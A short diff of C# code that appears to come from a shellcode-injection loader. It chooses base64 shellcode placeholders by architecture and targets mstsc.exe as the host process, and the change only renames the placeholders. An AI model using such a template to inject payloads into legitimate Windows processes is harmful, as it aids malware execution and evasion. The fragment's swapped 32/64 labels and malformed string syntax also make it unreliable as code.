@@ -14,13 +14,13 @@ public class Test
         if (IntPtr.Size == 4)
         {
             //x86
-            shellcode = Convert.FromBase64String("{SHELLCODE 64 HERE"}");
+            shellcode = Convert.FromBase64String("{SHELLCODE_64_HERE"}");
             process = "C:\\Windows\\SysWOW64\\mstsc.exe";
         }
         else
         {
             //x64
-            shellcode = shellcode = Convert.FromBase64String("{SHELLCODE 32 HERE"}");
+            shellcode = shellcode = Convert.FromBase64String("{SHELLCODE_32_HERE"}");
             process = "C:\\Windows\\System32\\mstsc.exe";
         }
 
